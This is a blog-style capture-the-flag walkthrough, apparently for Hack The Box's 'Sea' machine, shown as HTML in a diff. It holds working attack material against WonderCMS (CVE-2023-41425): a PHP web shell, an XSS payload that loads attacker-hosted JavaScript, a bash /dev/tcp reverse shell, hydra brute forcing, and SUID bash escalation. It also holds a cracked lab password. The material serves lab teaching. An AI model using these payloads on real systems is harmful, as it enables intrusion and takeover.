@@ -1,0 +1,401 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="">
+<meta name="description" content="HTB - Linux - Easy" />
+<meta name="keywords" content=", linux" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="http://localhost:1313/walkthroughs/sea/" />
+
+
+    <title>
+        
+            Sea :: TheFizzyFish-blog 
+        
+    </title>
+
+
+
+
+
+<link rel="stylesheet" href="/main.949191c1dcc9c4a887997048b240354e47152016d821198f89448496ba42e491.css" integrity="sha256-lJGRwdzJxKiHmXBIskA1TkcVIBbYIRmPiUSElrpC5JE=">
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+
+  <meta itemprop="name" content="Sea">
+  <meta itemprop="description" content="HTB - Linux - Easy">
+  <meta itemprop="datePublished" content="2024-08-27T17:30:59-04:00">
+  <meta itemprop="dateModified" content="2024-08-27T17:30:59-04:00">
+  <meta itemprop="wordCount" content="1339">
+  <meta itemprop="image" content="http://localhost:1313/">
+  <meta itemprop="keywords" content="Linux">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="http://localhost:1313/">
+  <meta name="twitter:title" content="Sea">
+  <meta name="twitter:description" content="HTB - Linux - Easy">
+
+
+
+
+
+
+
+    <meta property="article:published_time" content="2024-08-27 17:30:59 -0400 EDT" />
+
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">&gt;</span>
+            <span class="logo__text ">
+                $ cd /root/</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="/about/">About</a></li><li><a href="/common/">Common.txt</a></li><li><a href="/walkthroughs/">Walkthroughs</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            
+            </p>
+        </div>
+
+        <article>
+            <h2 class="post-title"><a href="http://localhost:1313/walkthroughs/sea/">Sea</a></h2>
+
+            
+            
+            
+
+            <div class="post-content">
+                <p>An easy linux HTB machine. Foothold involves some heavy enumeration and exploiting a XSS - CVE-2023-41425.
+Escalation is a bit simpler but requires some port forwarding.</p>
+<h1 id="enum">Enum</h1>
+<h2 id="port-scanning">Port Scanning</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>fish㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/sea<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ IP<span style="color:#f92672">=</span>10.10.11.28
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>fish㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/sea<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nmap -p- -T5 -oN all-ports.nmap $IP           
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-08-26 11:04 EDT
+</span></span><span style="display:flex;"><span>Warning: 10.10.11.28 giving up on port because retransmission cap hit <span style="color:#f92672">(</span>2<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.28
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.025s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65321</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>, <span style="color:#ae81ff">212</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE
+</span></span><span style="display:flex;"><span>22/tcp open  ssh
+</span></span><span style="display:flex;"><span>80/tcp open  http
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>fish㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/sea<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nmap -p22,80 -A -oN service-scan.nmap $IP  
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">3072</span> e3:54:e0:72:20:3c:01:42:93:d1:66:9d:90:0c:ab:e8 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> f3:24:4b:08:aa:51:9d:56:15:3d:67:56:74:7c:20:38 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 30:b1:05:c6:41:50:ff:22:a3:7f:41:06:0e:67:fd:50 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp open  http    Apache httpd 2.4.41 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>|_http-title: Sea - Home
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.41 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| http-cookie-flags: 
+</span></span><span style="display:flex;"><span>|   /: 
+</span></span><span style="display:flex;"><span>|     PHPSESSID: 
+</span></span><span style="display:flex;"><span>|_      httponly flag not set
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></div><h2 id="80http">80/HTTP</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>80/tcp open  http    Apache httpd 2.4.41 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>|_http-title: Sea - Home
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.41 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| http-cookie-flags: 
+</span></span><span style="display:flex;"><span>|   /: 
+</span></span><span style="display:flex;"><span>|     PHPSESSID: 
+</span></span><span style="display:flex;"><span>|_      httponly flag not set
+</span></span></code></pre></div><p><img src="/Screenshots/Sea_image_1.png" alt=""></p>
+<p>Browsing to the site, we see it&rsquo;s running php and we also get a hostname <code>sea.htb</code>, we&rsquo;ll need to add this to our /etc/hosts file.</p>
+<p><img src="/Screenshots/Sea_image_2.png" alt=""></p>
+<p>Easy way to add an entry to your hosts file:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;10.10.11.28 sea.htb&#39;</span> | sudo tee -a /etc/hosts
+</span></span></code></pre></div><p>Next we can start enumerating directories and vhosts while we look at the file <code>contact.php</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># gobuster directory enum</span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>fish㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/sea<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ gobuster dir -u $URL -w /opt/SecLists/Discovery/Web-Content/raft-large-words.txt -t <span style="color:#ae81ff">50</span> -x php -b 404,403 -o gobuster-80.out  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Vhost enumeration using ffuf, -fw filters by the number of words in a response.</span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>fish㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/sea<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ ffuf -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u $URL -H <span style="color:#e6db74">&#39;Host: FUZZ.sea.htb&#39;</span> -fw <span style="color:#ae81ff">582</span>
+</span></span></code></pre></div><p><img src="/Screenshots/Sea_image_3.png" alt=""></p>
+<p>No vhosts found this time.</p>
+<p>Gobuster results:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/contact.php          <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 2731<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/data                 <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 228<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://sea.htb/data/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/404                  <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 3341<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/home                 <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 3650<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/themes               <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 230<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://sea.htb/themes/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/.                    <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 3650<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/index.php            <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 3650<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/messages             <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 232<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://sea.htb/messages/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/0                    <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 3650<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/plugins              <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 231<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://sea.htb/plugins/<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>Looking at <code>contact.php</code>&hellip;
+<img src="/Screenshots/Sea_image_4.png" alt=""></p>
+<p>We can capture a response with burpsuite and examine it
+<img src="/Screenshots/Sea_image_5.png" alt=""></p>
+<p>The first thing that stands out to me is it asks for a website. Kind of a weird function but we can see if it uses this for any kind of functionality. Adding my tun0 IP as the website and setting up a nc listener shows it performs a web request. We might be able to leverage this as a SSRF.
+<img src="/Screenshots/Sea_image_6.png" alt=""></p>
+<p><img src="/Screenshots/Sea_image_7.png" alt=""></p>
+<p>No luck getting any kind of code execution from this. Timing is interesting as it&rsquo;s not directly after our initial web request but we get the hit on our server at random times after.</p>
+<p>Looking at <code>index.php</code> source, we can enumerate the theme &ldquo;bike&rdquo;.
+<img src="/Screenshots/Sea_image_8.png" alt=""></p>
+<p>Running gobuster against the <code>bike/</code> directory to see if we can find anything interest.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>fish㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/sea<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ echo $URL                                   
+</span></span><span style="display:flex;"><span>http://sea.htb/themes/bike
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>fish㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/sea<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ gobuster dir -u $URL -w /opt/SecLists/Discovery/Web-Content/quickhits.txt -t <span style="color:#ae81ff">50</span> -x php,md -b 404,403 -o gobuster-80.out 
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>/README.md            <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 318<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/README.md            <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 318<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/sym/root/home/       <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 3650<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/version              <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 6<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>We can GET the README.md file and see if we can enumerate the CMs
+<a href="http://sea.htb/themes/bike/README.md">http://sea.htb/themes/bike/README.md</a></p>
+<p><img src="/Screenshots/Sea_image_9.png" alt=""></p>
+<p>Nice, so we found the site is running <code>WonderCMS</code>. Good reminder to keep enumerating as initially I went down the SSRF rabbit hole.</p>
+<p>Checking version we find 3.2.0, not sure if it&rsquo;s the version of the theme <code>bike</code> or the cms.
+<img src="/Screenshots/Sea_image_10.png" alt=""></p>
+<p>A quick google shows us it&rsquo;s the version of wonderCMS and there&rsquo;s a CVE for this version
+<img src="/Screenshots/Sea_image_11.png" alt="">
+<a href="https://github.com/prodigiousMind/CVE-2023-41425">https://github.com/prodigiousMind/CVE-2023-41425</a> (Doesn&rsquo;t seem to work)</p>
+<p>We need the login URL and it seems like wondercms tries to hide that for some reason. Looking at the docs for any hints. finds page navigation from index.php?page=<code>page</code></p>
+<p><a href="https://github.com/WonderCMS/wondercms/wiki/Login-URL-doesn%27t-work---404">https://github.com/WonderCMS/wondercms/wiki/Login-URL-doesn%27t-work---404</a></p>
+<p><img src="/Screenshots/Sea_image_12.png" alt=""></p>
+<p>Some trial and error and noticing the docs referencing <code>loginurl</code> gets us the write URL &raquo; <code>http://sea.htb/index.php?page=loginURL</code>. We can also just shorten this to <code>/loginURL</code></p>
+<p><img src="/Screenshots/Sea_image_13.png" alt=""></p>
+<hr>
+<h1 id="foothold">Foothold</h1>
+<p>We can use another exploit on github to get a shell and then get a reverse shell on the box. <a href="https://github.com/charlesgargasson/CVE-2023-41425">https://github.com/charlesgargasson/CVE-2023-41425</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Setting vars</span>
+</span></span><span style="display:flex;"><span>RHOST<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://host.com:80&#34;</span>
+</span></span><span style="display:flex;"><span>LHOST<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;10.10.14.152&#34;</span>
+</span></span><span style="display:flex;"><span>LPORT<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;4444&#34;</span>
+</span></span><span style="display:flex;"><span>LPORTWEB<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;80&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Moving to a tmp dir</span>
+</span></span><span style="display:flex;"><span>cd <span style="color:#66d9ef">$(</span>mktemp -d<span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Creating our evil theme zip file</span>
+</span></span><span style="display:flex;"><span>mkdir -p evil
+</span></span><span style="display:flex;"><span>cat <span style="color:#e6db74">&lt;&lt;&#39;EOF&#39;&gt;evil/evil.php
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;?=`$_GET[0]`;?&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">EOF</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>zip -r evil.zip evil/
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># JS payload that will install the new theme</span>
+</span></span><span style="display:flex;"><span>cat <span style="color:#e6db74">&lt;&lt;EOF&gt;xssrce.js
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">var xhr=new XMLHttpRequest();
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">xhr.open(&#34;GET&#34;, &#34;${RHOST}/?installModule=http://${LHOST}:${LPORTWEB}/evil.zip&amp;directoryName=whatever&amp;type=themes&amp;token=&#34; + document.querySelectorAll(&#39;[name=&#34;token&#34;]&#39;)[0].value, true);
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">xhr.send();
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">EOF</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Print XSS url</span>
+</span></span><span style="display:flex;"><span>echo -e <span style="color:#e6db74">&#34;\n# XSS RCE&#34;</span>
+</span></span><span style="display:flex;"><span>cat <span style="color:#e6db74">&lt;&lt;EOF
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">${RHOST}/index.php?page=loginURL?&#34;&gt;&lt;/form&gt;&lt;script+src=&#34;http://${LHOST}:${LPORTWEB}/xssrce.js&#34;&gt;&lt;/script&gt;&lt;form+action=&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">EOF</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Starting a new web server to serve payloads</span>
+</span></span><span style="display:flex;"><span>sudo python3 -m http.server $LPORTWEB &amp;
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># id</span>
+</span></span><span style="display:flex;"><span>CMD<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;id&#34;</span>
+</span></span><span style="display:flex;"><span>curl --path-as-is <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>RHOST<span style="color:#e6db74">}</span><span style="color:#e6db74">/themes/evil/evil.php?0=</span><span style="color:#66d9ef">$(</span>echo -n <span style="color:#e6db74">&#34;</span>$CMD<span style="color:#e6db74">&#34;</span>| python3 -c <span style="color:#e6db74">&#34;import urllib.parse,sys; print(urllib.parse.quote_plus(sys.stdin.read()))&#34;</span><span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Reverse shell, (don&#39;t forget to listen first: nc -nvlp 4444)</span>
+</span></span><span style="display:flex;"><span>CMD<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/</span><span style="color:#e6db74">${</span>LHOST<span style="color:#e6db74">}</span><span style="color:#e6db74">/</span><span style="color:#e6db74">${</span>LPORT<span style="color:#e6db74">}</span><span style="color:#e6db74"> 0&gt;&amp;1&#39;&#34;</span>
+</span></span><span style="display:flex;"><span>curl --path-as-is <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>RHOST<span style="color:#e6db74">}</span><span style="color:#e6db74">/themes/evil/evil.php?0=</span><span style="color:#66d9ef">$(</span>echo -n <span style="color:#e6db74">&#34;</span>$CMD<span style="color:#e6db74">&#34;</span>| python3 -c <span style="color:#e6db74">&#34;import urllib.parse,sys; print(urllib.parse.quote_plus(sys.stdin.read()))&#34;</span><span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span>
+</span></span></code></pre></div><p>I used the above as a template to create my own python script &raquo; <a href="https://github.com/thefizzyfish/CVE-2023-41425-wonderCMS_RCE">https://github.com/thefizzyfish/CVE-2023-41425-wonderCMS_RCE</a></p>
+<p>Basic steps to exploit the vulnerability are:</p>
+<ol>
+<li>Create a php shell file and zip it within a <code>shell/</code> directory.</li>
+<li>Create and host a javascript file to install our zipped shell directory utilizing <code>installModule</code>.</li>
+<li>Host the shell file on a python server</li>
+<li>If you have admin access to the CMS you can just click the XSS payload, if not you have to get someone who does to click the XSS URL.</li>
+<li>Hit the URL where our command shell is &ldquo;installed&rdquo; for command injection.</li>
+</ol>
+<p><img src="/Screenshots/Sea_image_14.png" alt=""></p>
+<p>WonderCMS stores an encrypted password in data/database.js
+<img src="/Screenshots/Sea_image_15.png" alt=""></p>
+<pre tabindex="0"><code>$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ\/D.GuE4jRIikYiWrD3TM\/PjDnXm4q
+</code></pre><p>I attempted to use hashcat to crack the password but wasn&rsquo;t having any luck. Not quite sure why.</p>
+<p>There&rsquo;s two other user&rsquo;s on the host:
+<img src="/Screenshots/Sea_image_16.png" alt=""></p>
+<p>Two user&rsquo;s dirs found in <code>/home</code>  <code>amay</code> and <code>geo</code>
+<img src="/Screenshots/Sea_image_17.png" alt=""></p>
+<p>User.txt is in /home/amay so we&rsquo;ll likely need to to pivot to <code>amay</code>.</p>
+<p>Listing connections finds the box is listening on port 8080 locally.</p>
+<p><img src="/Screenshots/Sea_image_18.png" alt=""></p>
+<p>We can set up a reverse port forward using chisel to view the web page in our local browser.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># on attack box</span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>fish㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/sea<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ ./chisel_arm server --reverse --port <span style="color:#ae81ff">1080</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># On victim</span>
+</span></span><span style="display:flex;"><span>www-data@sea:/tmp$ ./chisel_amd client 10.10.14.7:1080 R:8001:127.0.0.1:8080
+</span></span><span style="display:flex;"><span>2024/08/27 17:55:49 client: Connecting to ws://10.10.14.7:1080
+</span></span><span style="display:flex;"><span>2024/08/27 17:55:49 client: Connected <span style="color:#f92672">(</span>Latency 24.188706ms<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>We can browse to the site  on our attack box at http://127.0.0.1:8001</p>
+<p><img src="/Screenshots/Sea_image_19.png" alt=""></p>
+<p>We can try and brute force the password with hydra, added both <code>amay</code> and <code>geo</code> to the file <code>user.txt</code> and sent it.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>fish㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/sea<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ hydra -L user.txt -P /usr/share/wordlists/rockyou.txt -f localhost http-get -s <span style="color:#ae81ff">8001</span> 
+</span></span></code></pre></div><p><img src="/Screenshots/Sea_image_20.png" alt="">
+and we have a match! We get the password for <code>amay:mychemicalromance</code>.</p>
+<p><img src="/Screenshots/Sea_image_21.png" alt=""></p>
+<p>And we see <code>amay</code> used the same password for the system as we&rsquo;re able to login via SSH</p>
+<p><img src="/Screenshots/Sea_image_22.png" alt=""></p>
+<p>We can get that user.txt file now.</p>
+<p><img src="/Screenshots/Sea_image_23.png" alt=""></p>
+<h2 id="exploits">Exploits</h2>
+<p><a href="https://github.com/thefizzyfish/CVE-2023-41425-wonderCMS_RCE">https://github.com/thefizzyfish/CVE-2023-41425-wonderCMS_RCE</a></p>
+<hr>
+<h1 id="privesc">PrivEsc</h1>
+<p>Looking at the functionality of the web app on <code>127.0.0.1:8000</code>, guessing we might be able to abuse it as we can use it to read the <code>auth.log</code> and <code>access.log</code> files. These files generally require higher than  privileges to access.</p>
+<p><img src="/Screenshots/Sea_image_24.png" alt=""></p>
+<p>We can proxy a request through burpsuite with curl to get a better idea of what&rsquo;s going on:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>fish㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/sea<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ curl -v --proxy 127.0.0.1:8080 -u amay:mychemicalromance localhost:8001 
+</span></span></code></pre></div><p>We can view the contents of the log with a post request. Notice the &ldquo;No suspicious traffic&hellip;&rdquo;</p>
+<p><img src="/Screenshots/Sea_image_25.png" alt=""></p>
+<p>Checking to see if we can see other files with the classic <code>/etc/passwd</code>
+<img src="/Screenshots/Sea_image_26.png" alt=""></p>
+<p>Looks like we can include a pipe within our log file param. This allows us to pipe a file to bash, executing it. Trying this with a reverse shell doesn&rsquo;t work as for some reason the process is killed quickly.</p>
+<p>Instead lets modify the permissions for an executable.</p>
+<p>We can use this to change the perms for the bash executable and get root with the following:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>amay@sea:/tmp$ cat rev.sh 
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#![](bin/bash</span>
+</span></span><span style="display:flex;"><span>chmod u+s /bin/bash
+</span></span></code></pre></div><p>Then when we perform our post request we can see the SUID bit is set on bash.</p>
+<p><img src="/Screenshots/Sea_image_27.png" alt=""></p>
+<p><img src="/Screenshots/Sea_image_28.png" alt=""></p>
+<p>We can change our EUID to root with a quick command found on <a href="https://gtfobins.github.io/gtfobins/bash/#suid">https://gtfobins.github.io/gtfobins/bash/#suid</a></p>
+<p><img src="/Screenshots/Sea_image_29.png" alt=""></p>
+<p>And we&rsquo;re done, we see our euid=0 making us effectively root! We can go and grab the root flag, submit it, and call it a day.</p>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+            
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>
+
+        <span class="tag"><a href="http://localhost:1313/tags/linux/">linux</a></span>
+        
+    </p>
+
+            
+  		</div>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2024</span>
+            <span><a href="http://localhost:1313/"></a></span>
+            <span></span>
+            
+            
+        </div>
+    </div>
+    
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>Powered by Four Gnomes in a Hoodie</a></span>
+        </div>
+    </div>
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+
